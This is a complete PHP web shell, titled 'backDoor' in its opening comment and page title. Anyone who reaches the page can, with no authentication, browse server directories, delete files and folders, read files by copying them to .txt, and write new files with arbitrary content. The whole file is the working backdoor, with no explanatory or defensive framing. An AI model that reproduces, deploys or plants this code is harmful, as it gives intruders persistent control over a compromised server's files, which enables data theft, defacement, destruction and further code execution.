<!-- backDoor [PHP 7.*] -->
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>backDoor</title>
        <style>
            .f {
                background-color: #eee;
                padding: 10px;
                margin: 5px;
            }
            .b {
                margin: 3px;
                background-color: #ddd;
                padding: 4px 10px;
            }
        </style>
    </head>
    <body>
        <?php
            function go($g) {echo '<script>window.location="'.$g.'";</script>';}
            function back() {echo '<script>window.history.back();</script>';}
            function cls() {echo '<script>window.close();</script>';}
            $l=$_GET[dir];
            if($l=='') $l='.';
            if($_GET[act]==del) {
                unlink($l);
                cls();
            }
            elseif($_GET[act]==deld) {
                rmdir($l);
                cls();
            }
            elseif($_GET[act]==get) {
                copy($l, $l.'_.txt');
                echo '
                    <script>window.open("'.$l.'_.txt");</script>
                ';
                go($l.'_.txt');
            }
            elseif($_GET[act]==adFl) {
                $f = fopen($l.'/'.$_GET[nm], w);
                fputs($f, $_GET[txt]);
                fclose($f);
                back();
            }
            elseif($_GET[act]==adDir) {
                mkdir($l.'/'.$_GET[nm]);
                back();
            }
            else {
                $d=scandir($l);
                echo '
                    <div class="f">
                        <a class="b" href="javascript:window.location.reload()">F5</a>
                        <a class="b" href="#" id="addDir">[+]</a>
                        <a class="b" href="#" id="addFile">+</a><br>
                        <input type="text" id="name"><br>
                        <textarea id="text"></textarea><br>
                    </div>
                ';
                foreach($d as $o) {
                    echo '
                    <div class="f">
                        <a class="b" href="'.$l.'/'.$o.'" target="_blank">^</a>
                        <a class="b" href="?dir='.$l.'/'.$o.'&act=get" target="_blank">\/</a>
                        <a class="b" href="?dir='.$l.'/'.$o.'&act=del" target="_blank">x</a>
                        <a class="b" href="?dir='.$l.'/'.$o.'&act=deld" target="_blank">[x]</a>
                        <a href="?dir='.$l.'/'.$o.'/">['.$o.']</a>
                    </div>
                    ';
                }
            }
        ?>
    </body>
    <script>
        var af, ad, f, t;
        document.addEventListener('DOMContentLoaded', function() {
            af = document.getElementById('addFile');
            ad = document.getElementById('addDir');
            f = document.getElementById('name');
            t = document.getElementById('text');
            af.addEventListener('click', function() {
                window.location = "<? echo explode('?', $_SERVER['REQUEST_URI'])[0]."?dir=".$l."&act=adFl&nm="; ?>"+f.value+'&txt='+t.value;
            });
            ad.addEventListener('click', function() {
                window.location = "<? echo explode('?', $_SERVER['REQUEST_URI'])[0]."?dir=".$l."&act=adDir&nm="; ?>"+f.value;
            });
        });
    </script>
</html>
